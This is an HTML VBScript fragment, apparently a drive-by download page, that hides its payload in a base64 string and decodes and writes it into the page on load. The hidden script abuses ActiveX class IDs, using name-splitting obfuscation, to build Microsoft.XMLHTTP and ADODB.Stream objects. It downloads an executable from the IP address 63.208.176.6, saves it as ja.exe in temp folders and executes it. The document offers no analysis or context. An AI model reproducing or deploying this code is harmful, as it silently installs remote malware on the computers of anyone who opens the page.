<script language="VBScript">
Function decode(ByVal str)
  Const b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim dataLength, sOut, groupBegin
  str = Replace(str, vbCrLf, "")
  str = Replace(str, vbTab, "")
  str = Replace(str, " ", "")
  dataLength = Len(str)
  If dataLength Mod 4 <> 0 Then
    Exit Function
  End If
  For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    numDataBytes = 3
    nGroup = 0
    For CharCounter = 0 To 3
      thisChar = Mid(str, groupBegin + CharCounter, 1)
      If thisChar = "=" Then
        numDataBytes = numDataBytes - 1
        thisData = 0
      Else
        thisData = InStr(1, b, thisChar, vbBinaryCompare) - 1
      End If
      If thisData = -1 Then
        Exit Function
      End If
      nGroup = 64 * nGroup + thisData
    Next
    nGroup = Hex(nGroup)
    nGroup = String(6 - Len(nGroup), "0") & nGroup
    pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 5, 2)))
    sOut = sOut & Left(pOut, numDataBytes)
  Next
  decode = sOut
End Function 
a = "PHNjcmlwdCBsYW5ndWFnZT0iVkJTY3JpcHQiPgpPbiBFcnJvciBSZXN1bWUgTmV4dApzZXQgZCA9IGRvY3VtZW50LmNyZWF0ZWVsZW1lbnQoIm8iJiJiIiYiaiImImUiJiJjIiYidCIpCkRpbSBpZHMoMTQpCmlkcygwKSAgPSAiQkQ5NkM1NTYtNjVBMy0xMUQwLTk4M0EtMDBDMDRGQzI5RTM2IgppZHMoMSkgID0gIkJEOTZDNTU2LTY1QTMtMTFEMC05ODNBLTAwQzA0RkMyOUUzNiIKaWRzKDIpICA9ICJBQjlCQ0VERC1FQzdFLTQ3RTEtOTMyMi1ENEEyMTA2MTcxMTYiCmlkcygzKSAgPSAiMDAwNkYwMzMtMDAwMC0wMDAwLUMwMDAtMDAwMDAwMDAwMDQ2IgppZHMoNCkgID0gIjAwMDZGMDNBLTAwMDAtMDAwMC1DMDAwLTAwMDAwMDAwMDA0NiIKaWRzKDUpICA9ICI2ZTMyMDcwYS03NjZkLTRlZTYtODc5Yy1kYzFmYTkxZDJmYzMiCmlkcyg2KSAgPSAiNjQxNDUxMkItQjk3OC00NTFELUEwRDgtRkNGREYzM0U4MzNDIgppZHMoNykgID0gIjdGNUI3RjYzLUYwNkYtNDMzMS04QTI2LTMzOUUwM0MwQUUzRCIKaWRzKDgpICA9ICIwNjcyM0UwOS1GNEMyLTQzYzgtODM1OC0wOUZDRDFEQjA3NjYiCmlkcyg5KSAgPSAiNjM5RjcyNUYtMUIyRC00ODMxLUE5RkQtODc0ODQ3NjgyMDEwIgppZHMoMTApID0gIkJBMDE4NTk5LTFEQjMtNDRmOS04M0I0LTQ2MTQ1NEM4NEJGOCIKaWRzKDExKSA9ICJEMEMwN0Q1Ni03QzY5LTQzRjEtQjRBMC0yNUY1QTExRkFCMTkiCmlkcygxMikgPSAiRThDQ0NEREYtQ0EyOC00OTZiLUIwNTAtNkMwN0M5NjI0NzZCIgpmb3IgaSA9IDAgdG8gMTMKCWQuc2V0YXR0cmlidXRlICJjIiYibCImImEiJiJzIiYicyImImkiJiJkIiwgImMiJiJsIiYicyImImkiJiJkIiYiOiImaWRzKGkpCglzZXQgYSA9IGQuY3JlYXRlb2JqZWN0KCJNIiYiaSImImMiJiJyIiYibyImInMiJiJvIiYiZiImInQiJiIuIiYiWCImIk0iJiJMIiYiSCImIlQiJiJUIiYiUCIsIiIpCglpZiBlcnIubnVtYmVyICA9IDAgdGhlbgoJCWV4aXQgZm9yCgllbmQgaWYKbmV4dApzZXQgZSA9IGQuY3JlYXRlb2JqZWN0KCJTIiYiYyImInIiJiJpIiYicCImInQiJiJpIiYibiImImciJiIuIiYiRiImImkiJiJsIiYiZSImIlMiJiJ5IiYicyImInQiJiJlIiYibSImIk8iJiJiIiYiaiImImUiJiJjIiYidCIsIiIpCnNldCBnID0gZC5jcmVhdGVvYmplY3QoIkEiJiJkIiYibyImImQiJiJiIiYiLiImIlMiJiJ0IiYiciImImUiJiJhIiYibSIsIiIpCmZvciBpID0gMCB0byA1CiAgIGlmIGkgPSAwIHRoZW4geCA9ICJjOlx3aW5kb3dzXHRlbXAiIGVsc2UgaWYgaSA9IDEgdGhlbiB4ID0gImM6XHRlbXAiIGVsc2UgaWYgaSA9IDIgdGhlbiB4ID0gImM6XHRtcCIgZWxzZSBpZiBpID0gMyB0aGVuIHggPSAiYzpcd2lubnRcdGVtcCIgZWxzZSBpZiBpID0gNCB0aGVuIHggPSAiYzpcIiBlbmQgaWYKICAgaCA9IGUuYnVpbGRwYXRoKHgsIlxqYS5leGUiKQogICBnLnR5cGUgPSAxCiAgIGEub3BlbiAiRyImIkUiJiJUIiwgImh0dHA6Ly82My4yMDguMTc2LjYvYWRzL3cucGhwIiwgMAogICBhLnNlbmQKICAgZy5vcGVuCiAgIGcud3JpdGUgYS5yZXNwb25zZWJvZHkKICAgZy5zYXZldG9maWxlIGgsMgogICBnLmNsb3NlCiAgIGlmIGVyci5udW1iZXIgPD4gMCB0aGVuIAoJRXJyLkNsZWFyCiAgIGVsc2UKCXNldCBpID0gZC5jcmVhdGVvYmplY3QoInMiJiJoIiYiZSImImwiJiJsIiYiLiImImEiJiJwIiYicCImImwiJiJpIiYiYyImImEiJiJ0IiYiaSImIm8iJiJuIiwiIikKCWkuc2hlbGxleGVjdXRlIGgsIklOU1RBTEwiLCIiLCJvIiYicCImImUiJiJuIiwwCglleGl0IGZvcgogICBFbmQgaWYKbmV4dAo8L3NjcmlwdD4K"
g = decode(a)
document.write(g)
</script>
